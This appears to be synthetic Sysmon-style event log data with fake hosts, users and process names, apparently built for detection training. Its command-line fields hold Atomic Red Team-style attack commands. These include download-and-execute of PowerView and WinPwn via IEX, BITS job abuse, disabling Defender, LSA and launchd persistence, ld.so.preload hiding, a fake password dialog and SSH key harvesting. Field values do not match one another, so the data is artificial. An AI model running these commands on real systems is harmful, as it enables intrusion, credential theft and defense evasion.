        "CommandLine": "\"bitsadmin.exe /create #{bits_job_name}\\nbitsadmin.exe /addfile #{bits_job_name} #{remote_file} #{local_file}\\nbitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} NULL\\nbitsadmin.exe /resume #{bits_job_name}\\nping -n 5 127.0.0.1 >nul 2>&1\\nbitsadmin.exe /complete #{bits_job_name}\\n\",",
        "LogonID": 655703,
        "LogonGuid": "7e2119a9-cb3d-4cee-918d-3e8481d58daa",
        "SourceProcessID": 1122,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Users\\Public\\discuss..dll",
        "DestinationProcessID": 9144,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Program Files\\shake..exe",
        "UtcTime": "2024-05-17T01:36:51.613097Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "lt-84.kennedy.com",
        "User": "slynch",
        "ProcessID": 6059,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroup -verbose\\n\",",
        "LogonID": 160441,
        "LogonGuid": "e045be4e-4f6c-4064-bd32-cdb8b293d2e8",
        "SourceProcessID": 5027,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Users\\Public\\senior..exe",
        "DestinationProcessID": 2483,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Program Files\\dark..exe",
        "UtcTime": "2024-05-17T01:36:51.613097Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "web-86.johnson-martinez.com",
        "User": "jasmin68",
        "ProcessID": 7400,
        "ProcessName": "malware.exe",
        "CommandLine": "\"which_python=`which python || which python3`\\n$which_python -c \\\"from zipfile import ZipFile; ZipFile('#{path_to_output_file}', mode='w').write('#{path_to_input_file}')\\\"\\n\",",
        "LogonID": 239663,
        "LogonGuid": "90b381b2-771d-43dc-b3bc-3a31c524b890",
        "SourceProcessID": 2371,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Program Files\\believe..exe",
        "DestinationProcessID": 1060,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Windows\\book..exe",
        "UtcTime": "2024-05-17T01:36:51.614008Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "desktop-09.smith.com",
        "User": "wdavis",
        "ProcessID": 9174,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"Get-Process\\n\",",
        "LogonID": 604926,
        "LogonGuid": "8feb21cd-0e8c-41a9-9bbd-152d7298a981",
        "SourceProcessID": 9755,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Program Files\\reduce..dll",
        "DestinationProcessID": 4950,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Windows\\dinner..dll",
        "UtcTime": "2024-05-17T01:36:51.614008Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "laptop-64.mills.com",
        "User": "tinafarley",
        "ProcessID": 3656,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"Get-ADComputer #{hostname} -Properties *\",",
        "LogonID": 578080,
        "LogonGuid": "a926233f-d619-471e-8476-e37108ac8bc5",
        "SourceProcessID": 6056,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Users\\Public\\term..exe",
        "DestinationProcessID": 7801,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Users\\Public\\security..dll",
        "UtcTime": "2024-05-17T01:36:51.614008Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "lt-60.williams-miller.org",
        "User": "jason43",
        "ProcessID": 5575,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"conhost.exe \\\"#{process}\\\"\\n\",",
        "LogonID": 569796,
        "LogonGuid": "12f84836-a305-426f-9352-0c356e4a5e0a",
        "SourceProcessID": 3585,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Windows\\write..dll",
        "DestinationProcessID": 2716,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Users\\Public\\the..exe",
        "UtcTime": "2024-05-17T01:36:51.615010Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "srv-56.shea.org",
        "User": "lmcpherson",
        "ProcessID": 6387,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"Copy-Item \\\"$PathToAtomicsFolder\\\\T1547.002\\\\bin\\\\package.dll\\\" C:\\\\Windows\\\\System32\\\\\\nreg add \\\"HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa\\\" /v \\\"Authentication Packages\\\" /t REG_MULTI_SZ /d \\\"msv1_0\\\\0package.dll\\\" /f\\n\",",
        "LogonID": 770134,
        "LogonGuid": "6612501f-8887-4c7e-bb0c-8dc539c03d32",
        "SourceProcessID": 7301,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Program Files\\sign..exe",
        "DestinationProcessID": 1490,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Program Files\\relationship..exe",
        "UtcTime": "2024-05-17T01:36:51.615010Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "web-08.anderson.net",
        "User": "terrymiller",
        "ProcessID": 8124,
        "ProcessName": "nc.exe",
        "CommandLine": "\"echo #{library_path} | tee -a /etc/ld.so.preload\\n/usr/local/bin/evil_script.py localhost -c 10 >/dev/null & pgrep -l evil_script.py || echo \\\"process hidden\\\"\\n\",",
        "LogonID": 795691,
        "LogonGuid": "2ce403b2-6072-47cc-a690-982fd1d4ea1e",
        "SourceProcessID": 3422,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Users\\Public\\fire..dll",
        "DestinationProcessID": 6227,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Program Files\\machine..exe",
        "UtcTime": "2024-05-17T01:36:51.615010Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "srv-59.wright-keith.com",
        "User": "hailey82",
        "ProcessID": 9963,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"osascript -e 'tell app \\\"System Preferences\\\" to activate' -e 'tell app \\\"System Preferences\\\" to activate' -e 'tell app \\\"System Preferences\\\" to display dialog \\\"Software Update requires that you type your password to apply changes.\\\" & return & return  default answer \\\"\\\" with icon 1 with hidden answer with title \\\"Software Update\\\"'\\n\",",
        "LogonID": 102550,
        "LogonGuid": "6df9cf7f-e6f3-4eff-8151-4338141d68cc",
        "SourceProcessID": 9228,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Windows\\picture..dll",
        "DestinationProcessID": 6334,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Windows\\relationship..exe",
        "UtcTime": "2024-05-17T01:36:51.615010Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "lt-15.massey.com",
        "User": "weaverjeffrey",
        "ProcessID": 1608,
        "ProcessName": "malware.exe",
        "CommandLine": "\"Set-MpPreference -DisableRealtimeMonitoring 1\\nSet-MpPreference -DisableBehaviorMonitoring 1\\nSet-MpPreference -DisableScriptScanning 1\\nSet-MpPreference -DisableBlockAtFirstSeen 1\\n\",",
        "LogonID": 954402,
        "LogonGuid": "8bdddd65-48a1-448a-978b-9b814433a9f1",
        "SourceProcessID": 3818,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Program Files\\bar..exe",
        "DestinationProcessID": 9021,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Program Files\\face..dll",
        "UtcTime": "2024-05-17T01:36:51.615010Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "lt-02.anderson.biz",
        "User": "troy97",
        "ProcessID": 6630,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"cscript \\\"#{vbscript}\\\" > $env:TEMP\\\\T1059.005.out.txt\\n\",",
        "LogonID": 378260,
        "LogonGuid": "bfc2e3fe-0fa3-469e-8fa8-4db80f145669",
        "SourceProcessID": 6087,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Users\\Public\\drive..exe",
        "DestinationProcessID": 1580,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Users\\Public\\tonight..exe",
        "UtcTime": "2024-05-17T01:36:51.616010Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "desktop-38.solomon.biz",
        "User": "michael34",
        "ProcessID": 5108,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"rundll32.exe javascript:\\\"\\\\..\\\\mshtml,RunHTMLApplication \\\";document.write();GetObject(\\\"script:#{file_url}\\\").Exec();window.close();\\n\",",
        "LogonID": 737164,
        "LogonGuid": "7faff5d1-3291-4cc7-b3cb-1a482a7a2189",
        "SourceProcessID": 1718,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Program Files\\listen..dll",
        "DestinationProcessID": 9324,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Program Files\\want..exe",
        "UtcTime": "2024-05-17T01:36:51.616010Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "laptop-74.moon-johnson.biz",
        "User": "heatherwarren",
        "ProcessID": 1934,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\\ndecryptteamviewer -consoleoutput -noninteractive  \",",
        "LogonID": 642452,
        "LogonGuid": "9e57159a-1003-434c-b2b5-c0324cabfa23",
        "SourceProcessID": 6897,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Windows\\statement..dll",
        "DestinationProcessID": 4122,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Windows\\site..dll",
        "UtcTime": "2024-05-17T01:36:51.616010Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "srv-06.lopez-lynch.com",
        "User": "xking",
        "ProcessID": 7406,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"Invoke-CimMethod -ClassName Win32_Product -MethodName #{action} -Arguments @{ PackageLocation = '#{msi_payload}' }\\n\",",
        "LogonID": 366184,
        "LogonGuid": "237163ed-faec-4fa5-b0b2-871bfa7dbbad",
        "SourceProcessID": 1206,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Program Files\\join..exe",
        "DestinationProcessID": 2012,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Windows\\which..exe",
        "UtcTime": "2024-05-17T01:36:51.616010Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "web-97.carey-roth.biz",
        "User": "josephcarter",
        "ProcessID": 6079,
        "ProcessName": "nc.exe",
        "CommandLine": "\"osascript -e 'tell application \\\"Terminal\\\" to do script \\\"tor\\\"'\\n\",",
        "LogonID": 197731,
        "LogonGuid": "b631c6b5-ad18-4f97-b40a-3a130d9c18e6",
        "SourceProcessID": 9421,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Windows\\continue..exe",
        "DestinationProcessID": 4328,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Windows\\listen..exe",
        "UtcTime": "2024-05-17T01:36:51.617011Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "web-18.lopez.com",
        "User": "jeffrey21",
        "ProcessID": 7495,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"mkdir #{output_folder}\\nfind #{search_path} -name id_rsa 2>/dev/null -exec rsync -R {} #{output_folder} \\\\;\\n\",",
        "LogonID": 527680,
        "LogonGuid": "ca62e772-4cd9-433e-b0ed-f74b3edac301",
        "SourceProcessID": 3058,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Windows\\executive..dll",
        "DestinationProcessID": 6591,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Windows\\story..exe",
        "UtcTime": "2024-05-17T01:36:51.617011Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "laptop-70.white.biz",
        "User": "christopher05",
        "ProcessID": 1452,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"get-smbshare\\n\",",
        "LogonID": 910113,
        "LogonGuid": "ef8a5fc1-e08e-4424-8b22-5da1782ce32d",
        "SourceProcessID": 4542,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Users\\Public\\join..exe",
        "DestinationProcessID": 6473,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Users\\Public\\expert..exe",
        "UtcTime": "2024-05-17T01:36:51.617011Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "srv-53.rogers.com",
        "User": "emilysmith",
        "ProcessID": 3611,
        "ProcessName": "malware.exe",
        "CommandLine": "\"sudo cp #{path_malicious_plist} /Library/LaunchDaemons/#{plist_filename}\\nsudo launchctl load -w /Library/LaunchDaemons/#{plist_filename}\\n\",",
        "LogonID": 477700,
        "LogonGuid": "3aadcb14-5ad5-4997-b0cf-0ff53e0b8d5f",
        "SourceProcessID": 4371,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Windows\\Congress..dll",
        "DestinationProcessID": 1397,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Program Files\\budget..exe",
        "UtcTime": "2024-05-17T01:36:51.617011Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "web-41.robinson.biz",
        "User": "doylerandall",
        "ProcessID": 6778,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"echo 0> /var/spool/mail/#{username}\\n\",",
        "LogonID": 473605,
        "LogonGuid": "b03c64dd-6a2d-416c-9d27-67398381ddf7",
        "SourceProcessID": 7008,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Windows\\issue..dll",
        "DestinationProcessID": 1894,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Windows\\be..dll",
        "UtcTime": "2024-05-17T01:36:51.617011Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "desktop-59.richardson.com",
        "User": "odonnellbenjamin",
        "ProcessID": 6550,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"chmod #{numeric_mode} #{file_or_folder}\\n\",",
        "LogonID": 168256,
        "LogonGuid": "f2a5221c-b84c-474e-a9c9-55a0392fd9f0",
        "SourceProcessID": 7404,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Windows\\along..dll",
        "DestinationProcessID": 4327,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Users\\Public\\put..dll",
        "UtcTime": "2024-05-17T01:36:51.618010Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "srv-57.herring.com",
        "User": "kathleen00",
        "ProcessID": 6350,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"hostname\\n\",",
        "LogonID": 951115,
        "LogonGuid": "b4b248e9-2d36-4195-b5b9-8f54496c32b4",
        "SourceProcessID": 2839,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Windows\\law..dll",
        "DestinationProcessID": 5403,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Users\\Public\\compare..dll",
        "UtcTime": "2024-05-17T01:36:51.618010Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "web-72.johns.com",
        "User": "perkinscarrie",
        "ProcessID": 1626,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"sc.exe create #{service_name} binPath= \\\"#{binary_path}\\\" start=#{startup_type}  type=#{service_type}\\nsc.exe start #{service_name}\\n\",",
        "LogonID": 686421,
        "LogonGuid": "c7f3734e-ad86-48c1-87d1-fbd93c79e3b6",
        "SourceProcessID": 7657,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Windows\\garden..dll",
        "DestinationProcessID": 9687,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Program Files\\around..exe",
        "UtcTime": "2024-05-17T01:36:51.618010Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "lt-76.costa-mosley.info",
        "User": "judith46",
        "ProcessID": 7144,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"reg add \\\"hklm\\\\system\\\\currentcontrolset\\\\control\\\\print\\\\monitors\\\\AtomicRedTeam\\\" /v \\\"Driver\\\" /d \\\"#{monitor_dll}\\\" /t REG_SZ /f\\n\",",
        "LogonID": 762415,
        "LogonGuid": "7daec929-c9b0-4a82-ad04-246457ffa51e",
        "SourceProcessID": 9740,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Users\\Public\\everybody..exe",
        "DestinationProcessID": 7274,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Program Files\\anyone..dll",
        "UtcTime": "2024-05-17T01:36:51.618010Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "laptop-00.turner.com",
        "User": "deanbell",
        "ProcessID": 8730,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"cmd /c \\\"for /l %x in (1,1,#{max_to_print}) do start wordpad.exe /p #{file_to_print}\\\" | out-null\\n\",",
        "LogonID": 445437,
        "LogonGuid": "355a1602-7c51-48a3-a42c-0a7618f3bdb3",
        "SourceProcessID": 3497,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Windows\\matter..dll",
        "DestinationProcessID": 6722,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Program Files\\security..exe",
        "UtcTime": "2024-05-17T01:36:51.618010Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "db-10.garcia-benitez.com",
        "User": "jessicasmith",
        "ProcessID": 8239,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"sudo #{program_path} -i #{ifname} -t 3\\n\",",
        "LogonID": 472372,
        "LogonGuid": "d5cc752b-9ab6-4a69-8a2c-995a2259d839",
        "SourceProcessID": 5630,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Users\\Public\\film..dll",
        "DestinationProcessID": 9647,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Program Files\\daughter..exe",
        "UtcTime": "2024-05-17T01:36:51.619008Z"
    },
